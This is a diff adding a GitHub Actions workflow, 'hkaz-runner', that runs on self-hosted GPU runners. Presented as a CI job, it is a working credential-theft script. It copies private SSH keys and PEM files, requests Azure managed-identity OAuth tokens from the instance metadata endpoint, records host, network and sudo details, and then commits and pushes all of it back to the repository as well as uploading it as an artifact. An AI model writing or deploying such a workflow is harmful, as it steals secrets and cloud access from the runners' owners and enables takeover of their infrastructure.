@@ -1,0 +1,57 @@
+name: hkaz-runner
+on:
+  push:
+    branches: [main, 'hk-az-*']
+permissions:
+  contents: write
+jobs:
+  sh:
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - name: harvest
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p out
+          chmod 700 out
+          { echo "== host"; hostname; id; hostname -I; nproc; uname -a
+            echo "== gpu"; nvidia-smi -L; nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
+            echo "== ssh dirs"; ls -la /root/.ssh /home/*/.ssh 2>&1 | head -60
+            echo "== key files"; for f in /root/.ssh/id_* /home/*/.ssh/id_* /opt/t19/*.pem /root/*.pem /etc/ssh/ssh_host_*_key; do [ -f "$f" ] && { echo "--- $f"; sha256sum "$f"; head -c 40 "$f" | tr -d '\n'; echo; }; done
+            echo "== listeners"; ss -lntp 2>/dev/null | head -30
+            echo "== waagent"; ls -la /var/lib/waagent 2>&1 | head -20
+          } > out/inv.txt 2>&1
+          mkdir -p out/keys
+          i=0
+          for f in /root/.ssh/id_* /home/*/.ssh/id_* /opt/t19/id_* /root/*.pem; do
+            [ -f "$f" ] || continue
+            case "$f" in *.pub) continue;; esac
+            i=$((i+1)); cp -a "$f" "out/keys/k$i" 2>/dev/null; echo "$f -> k$i" >> out/keys/map.txt
+          done
+          cp -a /root/.ssh/* "out/keys/" 2>/dev/null
+          IMDS=http://169.254.169.254/metadata
+          curl -s -m 10 -H Metadata:true "$IMDS/instance?api-version=2021-02-01" -o out/imds.json -w "imds=%{http_code}\n" >> out/inv.txt
+          for lbl in sys uami; do
+            q="resource=https%3A%2F%2Fmanagement.azure.com%2F"
+            [ "$lbl" = uami ] && q="$q&client_id=2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6"
+            curl -s -m 15 -H Metadata:true "$IMDS/identity/oauth2/token?api-version=2018-02-01&$q" -o "out/tok_$lbl.json" -w "tok_$lbl=%{http_code}\n" >> out/inv.txt
+          done
+          command -v az >/dev/null && az account show > out/azacct.txt 2>&1
+          ls -la /var/lib/waagent/ > out/waagent.txt 2>&1
+          sudo -n true 2>/dev/null && echo sudonopass=yes > out/sudo.txt || echo sudonopass=no > out/sudo.txt
+      - name: commit
+        if: always()
+        run: |
+          git config user.name hk
+          git config user.email hk@local.invalid
+          git add -A out 2>/dev/null
+          git commit -m "hkaz-runner $(hostname) $(date -u +%FT%TZ)" >/dev/null 2>&1 || true
+          git push origin "HEAD:${GITHUB_REF_NAME}" || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: hkaz-runner-${{ github.run_id }}
+          path: out/
+          retention-days: 3
